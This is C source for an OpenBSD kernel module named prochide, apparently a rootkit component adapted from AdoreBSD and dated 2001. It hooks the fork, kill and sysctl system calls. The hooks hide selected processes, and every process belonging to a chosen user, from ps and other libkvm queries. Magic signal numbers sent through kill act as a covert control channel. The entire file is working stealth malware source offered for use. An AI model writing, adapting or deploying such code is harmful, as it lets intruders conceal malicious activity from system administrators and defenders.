/*
 * prochide.c
 *
 * file: prochide.c
 *
 * process hiding LKM. Will hide any process
 * from queries by libkvm functions such as
 * those used by ps.c, etc.
 *
 * Credit goes to the openbsd source tree, 
 * bind, and bind's AdoreBSD from which i've
 * cheated and learned from. Will add remainder
 * of Adore functionality @ somepoint.
 *
 * Tested working under OpenBSD 2.9/x86
 *
 * 9-21-01
 *
 * mike@gravitino.net
 */

#include <sys/param.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <sys/cdefs.h>
#include <sys/proc.h>
#include <sys/exec.h>
#include <sys/lkm.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/syscallargs.h>
#include <sys/sysctl.h>
#include <sys/ucred.h>

/*
 * some defs..
 */
#define HIDDEN_FLAG 0x1000000

#define HIDEPID 0x400000
#define SHOWPID 0x400001
#define HIDEUID 0x400002
#define SHOWUID 0x400003

/*
 * syscall ptrs
 */
static sy_call_t *p_fork  ;
static sy_call_t *p_rfork ;
static sy_call_t *p_vfork ;
static sy_call_t *p_kill  ;
static sy_call_t *p_sysctl;

/*
 * function prototypes
 */
static int is_pid_hidden (pid_t pid);
static int hide_pid      (pid_t pid);
static int show_pid      (pid_t pid);

/*
 * static int to hold uid to hide (only 1 supported @ this time)
 */
static int hidden_uid;

/*
 * miscellaneous LKM =D
 */
MOD_MISC("prochide");

/*
 * wrapper functions
 */
static int h_sys_fork (struct proc *p, void *uap, int *retval)
{
	pid_t pid;

	pid = sys_fork(p, uap, retval);

	if(pid > 0 && is_pid_hidden(p->p_pid))
	{
		hide_pid(pid);
	}

	return(pid);
}

static int h_sys_rfork(struct proc *p, void *uap, int *retval)
{
	pid_t pid;

	pid = sys_rfork(p, uap, retval);

	if(pid > 0 && is_pid_hidden(p->p_pid))
	{
		hide_pid(pid);
	}

	return(pid);
}

static int h_sys_vfork(struct proc *p, void *uap, int *retval)
{
	pid_t pid;

	pid = sys_vfork(p, uap, retval);

	if(pid > 0 && is_pid_hidden(p->p_pid))
	{
		hide_pid(pid);
	}

	return(pid);
}

/*
 * is process hidden flag set?
 */
static int is_pid_hidden(pid_t pid)
{
	struct proc *p = NULL;
	
	p = pfind(pid);
	if(p == NULL)
	{
		return(0);
	}

	return ((p->p_flag & HIDDEN_FLAG) ? 1 : 0);
}

/*
 * set process hidden flag
 */
static int hide_pid (pid_t pid)
{	
	struct proc *p = NULL;

	/*
	 * lookup process
	 */
	p = pfind(pid);
	if(p == NULL)
	{
		return(1);
	}

	/*
	 * is pid already hidden?
	 */
	if(is_pid_hidden(pid))
	{
		return(0);
	}

	/*
	 * set hidden flag 
	 */
	p->p_flag ^= HIDDEN_FLAG;

	return(0);
}

/*
 * unset process hidden flag
 */
static int show_pid (pid_t pid)
{
	struct proc *p = NULL;

	/*
	 * lookup process
	 */
	p = pfind(pid);
	if(p == NULL)
	{
		return(1);
	}

	/*
	 * is hidden flag already set?
	 */
	if(!is_pid_hidden(pid))
	{
		return(0);
	}

	/*
	 * unset hidden flag
	 */
	p->p_flag ^= HIDDEN_FLAG;

	return(0);
}

/*
 * hide/show processes & uid via kill syscall. see ph_cli.c
 * for usage.
 */
static int h_sys_kill  (struct proc *p, void *uap, int *retval)
{
	struct sys_kill_args *args = uap;
	int    ret;

	if(SCARG(args, signum) == HIDEPID)
	{
		ret = hide_pid(SCARG(args, pid));
		return(ret);
	}

 	if(SCARG(args, signum) == SHOWPID)
	{
		ret = show_pid(SCARG(args, pid));
		return(ret);
	}

	if(SCARG(args, signum) == HIDEUID)
	{
		hidden_uid = SCARG(args, pid);
		return(0);
	}

	if(SCARG(args, signum) == SHOWUID)
	{
		hidden_uid = 0xCCCC;
		return(0);
	}

	return sys_kill(p, uap, retval);
}	

#define GETPROC() copyin(SCARG(args,old) + (idx * sizeof(kp)), &kp, sizeof(kp));

/*
 * copy elements in process list over 
 * element containing proc info to be
 * hidden.
 */
static int overlap(void *uaddr, int cnt)
{
	struct kinfo_proc kp;
	int    idx;

	for(idx=0; idx < cnt; ++idx)
	{
		copyin (uaddr + ((idx + 1) * sizeof(kp)), &kp, sizeof(kp));
		copyout(&kp, uaddr + (idx * sizeof(kp)), sizeof(kp));
	}
}

/*
 * sysctl wrapper - process output from libkvm 
 * and remove processes that are hidden or processes
 * that belong to a hidden user.
 */
static int h_sys_sysctl(struct proc *p, void *uap, int *retval)
{
	struct sys___sysctl_args *args = uap;
	struct kinfo_proc kp;
	struct pcred *pc;
	size_t nproc;
	size_t tsize;
	int    *mib ;
	int    ret  ;
	int    idx  ;
	int    offset;
	int    cuid = p->p_cred->p_ruid; // caller's real uid

	// call function
	ret = sys___sysctl(p, uap, retval);

	mib = SCARG(args, name);

	// process output - is process listing?
	if(ret    != -1        && 
	   mib[0] == CTL_KERN  &&
	   mib[1] == KERN_PROC &&
	   SCARG(args, old) != NULL) // not size getting calls..
	{
		// get # of bytes comprising proc structs
		copyin(SCARG(args, oldlenp), &nproc, sizeof(size_t));
		
		// calc # of kinfo_proc structs
		nproc /= sizeof(struct kinfo_proc);
		tsize =  nproc;

		/*
		 * remove hidden structs from output
		 */
		if(nproc > 0)
		{
			for(idx=0; idx < nproc; ++idx)
			{
				// copy idx into kp using macro
				GETPROC();

				/*
				 * show to hidden user but not to
				 * other users.. if no hidden user
				 * is set, show to nobody (unless
				 * their uid is 0xCCCC)
				 */
				if((cuid != hidden_uid &&
				   is_pid_hidden(kp.kp_proc.p_pid)) ||
				   (cuid != hidden_uid &&
				    kp.kp_proc.p_cred->p_ruid == hidden_uid))
				{	
					// overlap hidden pid data
					overlap(SCARG(args,old) + 
						(idx * sizeof(kp)), 
						nproc - idx - 1);

					// decrement size
					--tsize;
					--idx;
					--nproc;
					continue;
				}
			}

			tsize *= sizeof(struct kinfo_proc);	

			// update len
			copyout(&tsize, SCARG(args, oldlenp), sizeof(size_t));
		}
	}

	return(ret);
}

/*
 * module load handler
 */
static int prochide_load   (struct lkm_table *lkmtp, int cmd)
{
	if(cmd == LKM_E_LOAD)
	{
		/*
		 * save syscall ptrs
		 */
		p_fork   = sysent[SYS_fork    ].sy_call;
		p_rfork  = sysent[SYS_rfork   ].sy_call;
		p_vfork  = sysent[SYS_vfork   ].sy_call;
		p_kill   = sysent[SYS_kill    ].sy_call;
		p_sysctl = sysent[SYS___sysctl].sy_call;

		/*
		 * replace w/ prochide wrapper functions
		 */
		sysent[SYS_fork    ].sy_call = h_sys_fork  ;
		sysent[SYS_rfork   ].sy_call = h_sys_rfork ;
		sysent[SYS_vfork   ].sy_call = h_sys_vfork ;
		sysent[SYS_kill    ].sy_call = h_sys_kill  ;
		sysent[SYS___sysctl].sy_call = h_sys_sysctl;

		/*
		 * initialize hidden userid
		 */ 
		hidden_uid = 0xCCCC;
	}

	return(0);
}

/*
 * module unload handler
 */
static int prochide_unload (struct lkm_table *lkmtp, int cmd)
{
	if(cmd == LKM_E_UNLOAD)
	{
		/*
		 * restore syscall ptrs
		 */
		sysent[SYS_fork    ].sy_call = p_fork  ;
		sysent[SYS_rfork   ].sy_call = p_rfork ;
		sysent[SYS_vfork   ].sy_call = p_vfork ;
		sysent[SYS_kill    ].sy_call = p_kill  ;
		sysent[SYS___sysctl].sy_call = p_sysctl;
	}

	return(0);
}

/*
 * entry point / cmd dispatcher
 */
int prochide_handler(struct lkm_table *lkmtp, int cmd, int ver)
{
	DISPATCH(lkmtp, cmd, ver, prochide_load, prochide_unload, lkm_nofunc);
}
